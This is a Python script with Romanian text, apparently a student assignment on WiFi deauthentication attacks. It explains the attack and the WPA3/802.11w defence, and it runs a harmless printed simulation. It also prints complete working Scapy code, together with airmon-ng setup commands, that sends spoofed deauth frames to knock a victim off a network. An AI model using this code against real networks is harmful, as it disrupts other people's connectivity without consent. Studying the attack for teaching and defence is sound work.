import time


MAC_ROUTER  = "AA:BB:CC:DD:EE:FF"
MAC_VICTIMA = "11:22:33:44:55:66"
NR_PACHETE  = 10
INTERVAL    = 0.1


def afiseaza_teorie():
    print("=" * 55)
    print("   TEMA 4 - Eliminarea unui user din retea WiFi")
    print("=" * 55)
    print("""
 DESCRIERE:
 ----------
 Atacul de deauthentication exploateaza o vulnerabilitate
 din standardul WiFi 802.11. Cadrele de management
 (inclusiv deauthentication) NU sunt criptate in WPA/WPA2,
 deci oricine le poate falsifica.

 PASI:
 -----
 1. Interfata WiFi se pune in modul MONITOR
    (permite capturarea/trimiterea oricaror cadre 802.11)

 2. Se identifica MAC-ul router-ului si al victimei
    (cu airodump-ng sau ARP scan)

 3. Se construieste un cadru Dot11Deauth:
    - addr1 = MAC victima   (destinatie)
    - addr2 = MAC router    (sursa falsificata)
    - addr3 = MAC router    (BSSID)
    - reason = 7            (motivul deconectarii)

 4. Se trimite repetat cu sendp() din Scapy
    Victima crede ca router-ul i-a cerut deconectarea.

 REASON CODES 802.11:
 --------------------
   1 = Unspecified
   2 = Auth no longer valid
   3 = Station leaving
   4 = Inactivity
   7 = Class 3 frame from non-associated STA (cel mai comun)

 APARARE:
 --------
   WPA3 + IEEE 802.11w (PMF - Protected Management Frames)
   cripteaza cadrele de management => atacul nu mai merge.

 CERINTE (Linux):
 ----------------
   pip install scapy
   sudo airmon-ng start wlan0
   sudo python main.py

 NOTA WINDOWS:
 -------------
   Pe Windows nu se pot trimite cadre 802.11 raw.
   Scapy necesita WinPcap/Npcap si o placa WiFi
   compatibila cu modul monitor (foarte rar pe Windows).
   Atacul functioneaza nativ doar pe Linux.
""")


def simuleaza_atac(mac_router, mac_victima, nr_pachete, interval):
    """
    Simuleaza vizual trimiterea cadrelor deauth.
    Pe Linux cu interfata monitor, sendp() ar trimite efectiv pachetele.
    """
    print("=" * 55)
    print("   SIMULARE ATAC (fara trimitere reala)")
    print("=" * 55)
    print(f"\n  Router  (AP) : {mac_router}")
    print(f"  Victima      : {mac_victima}")
    print(f"  Pachete      : {nr_pachete}")
    print()

    for i in range(1, nr_pachete + 1):
        print(f"  [Pachet {i:>3}/{nr_pachete}] Deauth frame -> {mac_victima}  reason=7")
        time.sleep(interval)

    print(f"\n  Rezultat: {mac_victima} a fost deconectat din retea.")


def cod_linux():
    """Afiseaza codul care ar rula pe Linux."""
    print("\n" + "=" * 55)
    print("   COD PYTHON PENTRU LINUX (cu Scapy)")
    print("=" * 55)
    print("""
from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

MAC_ROUTER  = "AA:BB:CC:DD:EE:FF"
MAC_VICTIMA = "11:22:33:44:55:66"
INTERFATA   = "wlan0mon"

cadru = (
    RadioTap() /
    Dot11(
        addr1=MAC_VICTIMA,
        addr2=MAC_ROUTER,
        addr3=MAC_ROUTER
    ) /
    Dot11Deauth(reason=7)
)

for i in range(100):
    sendp(cadru, iface=INTERFATA, verbose=False)
    print(f"Pachet {i+1} trimis")

# Rezultat: victima se deconecteaza de la WiFi
""")


if __name__ == "__main__":
    afiseaza_teorie()
    simuleaza_atac(MAC_ROUTER, MAC_VICTIMA, NR_PACHETE, INTERVAL)
    cod_linux()